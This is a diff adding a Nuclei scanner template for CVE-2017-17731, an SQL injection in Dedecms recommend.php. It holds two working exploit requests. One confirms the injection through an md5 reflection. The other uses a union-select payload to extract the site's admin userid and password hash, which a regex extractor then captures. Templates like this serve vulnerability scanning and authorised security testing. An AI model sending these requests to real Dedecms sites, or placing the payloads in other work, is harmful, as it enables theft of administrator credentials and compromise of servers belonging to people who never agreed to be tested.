@@ -1,0 +1,48 @@
+id: dedecms-recommend-sqli
+info:
+  name: Dedecms recommend.php SQL Injection Vulnerability (CVE-2017-17731)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Dedecms through 5.7 has an SQL Injection vulnerability via the $_FILES superglobal to plus/recommend.php.
+    Attackers can execute arbitrary SQL commands to steal data, modify it, or even take control of the server.
+  tags: sqli,php
+  reference:
+    - https://github.com/fengxuangit/dede_exp_collect/blob/master/dede_recommend.php_sqli.py
+    - http://www.dedecms.com/
+variables:
+  cmd_payload: "select CONCAT(0x7c,userid,0x7c,pwd) from ~#@__admin~ limit 0,1"
+http:
+  - raw:
+      - |
+        GET /plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=%27%20or%20mid=@%60%27%60%20/*!50000union*//*!50000select*/1,2,3,md5(12),5,6,7,8,9%23@%60%27%60+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=4294 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: nuclei
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "58c89562f58fd276f592420068db8c09"
+        part: body
+  - raw:
+      - |
+        GET /plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=%27%20or%20mid=@%60%27%60%20/*!50000union*//*!50000select*/1,2,3,({{cmd_payload}}),5,6,7,8,9%23@%60%27%60+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=4294 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: nuclei
+    extractors:
+      - type: regex
+        group: 1
+        regex:
+          - "<h2>.*?\\|(.*?)<\\/h2>"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<h2>"
+        part: body
